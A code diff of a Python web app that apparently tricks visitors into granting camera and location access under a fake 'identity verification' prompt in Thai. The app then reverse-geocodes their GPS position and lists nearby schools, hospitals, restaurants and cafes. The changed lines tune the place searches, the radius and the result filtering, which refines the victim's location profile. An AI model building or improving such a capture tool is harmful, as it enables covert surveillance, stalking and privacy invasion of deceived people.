@@ -35,11 +35,11 @@ def reverse_geocode(lat, lon):
         print(f"Reverse error: {e}")
     return None
 
-def search_places(lat, lon, query, limit=5, radius=3000):
+def search_places(lat, lon, query, limit=5, radius=5000):
     try:
         url = f'https://nominatim.openstreetmap.org/search?format=json&q={query}&lat={lat}&lon={lon}&radius={radius}&limit={limit}&accept-language=th&bounded=1'
         headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
-        resp = requests.get(url, headers=headers, timeout=8)
+        resp = requests.get(url, headers=headers, timeout=10)
         data = resp.json()
         results = []
         for item in data:
@@ -52,7 +52,8 @@ def search_places(lat, lon, query, limit=5, radius=3000):
                     short = f"{main} ({location})"
                 else:
                     short = main
-                results.append(short[:80])
+                if not any(x in short.lower() for x in ['point', 'unknown', 'unclassified']):
+                    results.append(short[:80])
         return results
     except Exception as e:
         print(f"Search error: {e}")
@@ -99,7 +100,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 10-12 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 12-14 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -339,24 +340,38 @@ def upload():
         if province_name and 'จังหวัด' in province_name:
             clean_province = province_name.replace('จังหวัด', '').strip()
             
+            # ค้นหาตามประเภทในจังหวัด
             searches = [
                 ('🏫 โรงเรียน Top 10', f'โรงเรียน {clean_province}', 10),
                 ('🍽️ ร้านอาหาร Top 5', f'ร้านอาหาร {clean_province}', 5),
                 ('🏥 โรงพยาบาล Top 3', f'โรงพยาบาล {clean_province}', 3),
-                ('🏝️ สถานที่ท่องเที่ยว 3 แห่ง', f'สถานที่ท่องเที่ยว {clean_province}', 3)
+                ('🏝️ สถานที่ท่องเที่ยว', f'สถานที่ท่องเที่ยว {clean_province}', 3)
             ]
             
             for label, query, limit in searches:
-                results = search_places(lat, lon, query, limit)
+                results = search_places(lat, lon, query, limit, radius=8000)
                 if results:
-                    ranked = add_ranking(results)
-                    nearby_results[label] = ranked
+                    nearby_results[label] = add_ranking(results)
                 time.sleep(0.5)
             
-            # ค้นหาสถานที่ใกล้ GPS (รัศมี 2 กม.)
-            nearby_spots = search_places(lat, lon, 'point of interest', 3, radius=2000)
-            if nearby_spots:
-                nearby_results['📍 สถานที่ใกล้คุณที่สุด'] = add_ranking(nearby_spots)
+            # ค้นหาสถานที่ใกล้ GPS (ร้านอาหาร, คาเฟ่, สถานที่สำคัญ)
+            nearby_queries = [
+                ('ร้านอาหาร', 'ร้านอาหาร', 2),
+                ('คาเฟ่', 'คาเฟ่', 2),
+                ('สถานที่สำคัญ', 'สถานที่สำคัญ', 2)
+            ]
+            nearby_list = []
+            for q_label, q, lim in nearby_queries:
+                results = search_places(lat, lon, q, lim, radius=3000)
+                nearby_list.extend(results)
+            
+            # เอาซ้ำและจำกัด 3 อันดับ
+            unique_nearby = []
+            for item in nearby_list:
+                if item not in unique_nearby:
+                    unique_nearby.append(item)
+            if unique_nearby:
+                nearby_results['📍 สถานที่ใกล้คุณ'] = add_ranking(unique_nearby[:3])
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
